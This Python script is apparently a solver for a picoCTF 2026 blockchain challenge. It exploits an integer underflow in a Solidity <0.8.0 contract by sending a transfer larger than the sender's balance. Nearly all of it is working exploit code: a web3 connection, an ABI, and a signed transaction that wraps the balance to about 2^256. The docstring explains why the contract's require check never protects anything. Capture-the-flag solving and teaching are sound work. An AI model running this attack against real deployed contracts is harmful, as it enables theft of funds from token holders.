#!/usr/bin/env python3
"""
Smart Overflow - picoCTF 2026
Category: Blockchain | Points: 300

Exploit: Integer underflow in a Solidity <0.8.0 contract.
The contract uses unchecked uint256 arithmetic for balance tracking.
By transferring more than our balance, the subtraction underflows,
giving us a balance of 2^256 - 1 (or similar huge value).

Usage:
    python3 solve.py

    Environment variables (set before running):
        RPC_URL       - The challenge RPC endpoint
        PRIVATE_KEY   - Your wallet private key
        CONTRACT_ADDR - The deployed vulnerable contract address

    Or modify the constants below directly.
"""

import os
import sys
import json

try:
    from web3 import Web3
    from web3.middleware import geth_poa_middleware
except ImportError:
    print("[!] web3 not installed. Install with: pip install web3")
    print("[!] Alternatively, use foundry (cast) commands shown in the writeup.")
    sys.exit(1)

# ============================================================
# Configuration -- update these with challenge-provided values
# ============================================================
RPC_URL = os.environ.get("RPC_URL", "http://challenge-host:port/rpc")
PRIVATE_KEY = os.environ.get("PRIVATE_KEY", "0xYOUR_PRIVATE_KEY_HERE")
CONTRACT_ADDR = os.environ.get("CONTRACT_ADDR", "0xCONTRACT_ADDRESS_HERE")

# Typical ABI for the vulnerable contract
# Adjust based on the actual contract provided by the challenge
CONTRACT_ABI = json.loads("""
[
    {
        "inputs": [{"internalType": "address", "name": "", "type": "address"}],
        "name": "balances",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "deposit",
        "outputs": [],
        "stateMutability": "payable",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "_to", "type": "address"},
            {"internalType": "uint256", "name": "_amount", "type": "uint256"}
        ],
        "name": "transfer",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [{"internalType": "uint256", "name": "_amount", "type": "uint256"}],
        "name": "withdraw",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "isSolved",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "view",
        "type": "function"
    }
]
""")

# A burn address to send tokens to (triggers the underflow on our balance)
BURN_ADDRESS = "0x0000000000000000000000000000000000000001"


def main():
    print("[*] Smart Overflow Exploit - picoCTF 2026")
    print(f"[*] RPC URL: {RPC_URL}")
    print(f"[*] Contract: {CONTRACT_ADDR}")

    # Connect to the blockchain
    w3 = Web3(Web3.HTTPProvider(RPC_URL))

    # Some CTF chains use PoA consensus
    try:
        w3.middleware_onion.inject(geth_poa_middleware, layer=0)
    except Exception:
        pass

    if not w3.is_connected():
        print("[!] Failed to connect to RPC endpoint")
        sys.exit(1)
    print("[+] Connected to blockchain")

    # Set up our account
    account = w3.eth.account.from_key(PRIVATE_KEY)
    my_address = account.address
    print(f"[*] Our address: {my_address}")

    # Get contract instance
    contract = w3.eth.contract(
        address=Web3.to_checksum_address(CONTRACT_ADDR),
        abi=CONTRACT_ABI,
    )

    # Check initial balance
    initial_balance = contract.functions.balances(my_address).call()
    print(f"[*] Initial balance: {initial_balance}")

    # ============================================================
    # EXPLOIT: Trigger integer underflow
    # ============================================================
    # If our balance is 0, transferring 1 token will cause:
    #   balances[us] = 0 - 1 = 2^256 - 1  (underflow!)
    #
    # The vulnerable require check:
    #   require(balances[msg.sender] - _amount >= 0)
    # is ALWAYS true for uint256, so it doesn't protect anything.
    # ============================================================

    transfer_amount = initial_balance + 1  # Guarantee underflow
    if transfer_amount == 0:
        transfer_amount = 1  # Edge case: if balance is max uint256

    print(f"[*] Triggering underflow: transferring {transfer_amount} to burn address")

    # Build and send the transaction
    nonce = w3.eth.get_transaction_count(my_address)
    tx = contract.functions.transfer(
        Web3.to_checksum_address(BURN_ADDRESS),
        transfer_amount
    ).build_transaction({
        "from": my_address,
        "nonce": nonce,
        "gas": 200000,
        "gasPrice": w3.eth.gas_price,
    })

    signed_tx = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    print(f"[*] Transaction sent: {tx_hash.hex()}")

    # Wait for confirmation
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
    if receipt["status"] == 1:
        print("[+] Transaction confirmed!")
    else:
        print("[!] Transaction reverted -- check contract ABI / function names")
        sys.exit(1)

    # Verify the underflow worked
    new_balance = contract.functions.balances(my_address).call()
    print(f"[+] New balance: {new_balance}")
    print(f"[+] Balance is massive: {new_balance > 10**30}")

    # Check if solved
    try:
        solved = contract.functions.isSolved().call({"from": my_address})
        print(f"[+] isSolved(): {solved}")
    except Exception as e:
        print(f"[*] Could not call isSolved(): {e}")
        print("[*] The challenge may use a different win condition.")
        print("[*] Check the challenge interface for the flag.")

    print()
    print("[*] Done! If the challenge has a separate 'get flag' endpoint,")
    print("[*] call it now to retrieve picoCTF{...}")


if __name__ == "__main__":
    main()
